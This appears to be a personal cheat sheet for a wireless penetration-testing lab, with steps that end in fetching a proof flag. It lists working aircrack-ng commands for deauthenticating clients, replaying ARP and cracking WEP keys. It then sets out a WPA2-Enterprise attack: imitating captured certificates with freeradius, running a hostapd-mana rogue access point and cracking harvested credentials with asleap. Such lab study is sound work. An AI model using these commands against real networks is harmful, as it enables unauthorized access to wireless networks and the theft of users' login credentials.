Attacking WEP:

# prep monitoring interface

airmon-ng check kill
airmon-ng start wlan0

# setup active listener to catch traffic

airodump-ng --bssid <BSSID> -c <CHANNEL> -w <OUTFILE> <IFACE>

# deauth to generate some data and reveal clients

aireplay-ng -0 0 -a <BSSID> <IFACE>

# fake auth to generate IVs

aireplay-ng -1 6 -e <SSID> -a <BSSID> -h <CLIENT MAC> <IFACE>

# when enough ARP requests are caught, use arpreplay

aireplay-ng -3 -b <BSSID> -h <CLIENT MAC> <IFACE>

Be patient, it'll take a while to get enough IVs

Start running aircrack on the pcap file to crack it:

aircrack-ng <file>

login to network:
sudo /sbin/ifconfig wlan0 up
sudo /sbin/iwlist wlan0 scan
sudo /sbin/iwconfig wlan0 essid "NetworkName"
sudo /sbin/iwconfig wlan0 key network_key
sudo /sbin/iwconfig wlan0 enc on

You may need to run 'dhclient wlan0'

alternative method:

sudo iwconfig wlan0 essid <SSID> key s:<KEY>
sudo dhclient wlan0

Get flag:
curl 192.168.1.1/proof.txt

WPA2 Enterprise:

Look for WPA MGT network in airodump

Grab cert files from wireshark / tshark traffic using tls.handshake.type == 11,3 or tls.handshake.certificate filters
  - view Packet Details >> TLSv1 Record Layer: Handshake Protocol: Certificate
  - save certificates to file, right click cert string and click Export Packet Bytes

View SSL cert info:
openssl x509 -inform der -in CERTIFICATE_FILENAME -text

Use freeradius to provide fake cert to clients
  - alter certificate_authority block in /etc/freeradius/3.0/certs/ca.cnf:

    [certificate_authority]
    countryName             = US
    stateOrProvinceName     = {2 letter state}
    localityName            = {City}
    organizationName        = {Company Name}
    emailAddress            = {Email}
    commonName              = "Such and Such Certificate Authority"

  - alter server block in /etc/freeradius/3.0/certs/server.cnf:

    [server]
    countryName             = US
    stateOrProvinceName     = {2 letter state}
    localityName            = {City}
    organizationName        = {Company Name}
    emailAddress            = {Email}
    commonName              = "Playtronics"

  - change dir to /etc/freeradius/3.0/certs/ and run:
    rm dh
    make

  - YOU WILL GET AN ERROR, but it doesn't matter

Setup hostapd-mana for the rogue AP using the (updated!) mana.conf file, move to etc/hostapd-mana/mana.conf

Use mana.eap_user file, move to /etc/hostapd-mana/mana.eap_user

Start hostapd-mana:
hostapd-mana /etc/hostapd-mana/mana.conf

Hostapd-mana will output asleap commands, find a user with a successful login (from wireshark traffic) and run command like so:
<asleap command> -W /usr/share/john/password.lst

connect to WPA2 EAP via wpa_supplicant:

network={
  ssid="NetworkName"
  scan_ssid=1
  key_mgmt=WPA-EAP
  identity="Domain\username"
  password="password"
  eap=PEAP
  phase1="peaplabel=0"
  phase2="auth=MSCHAPV2"
}


Connect to network:

wpa_supplicant -c <config file>

curl 192.168.1.1/proof.txt

DONE
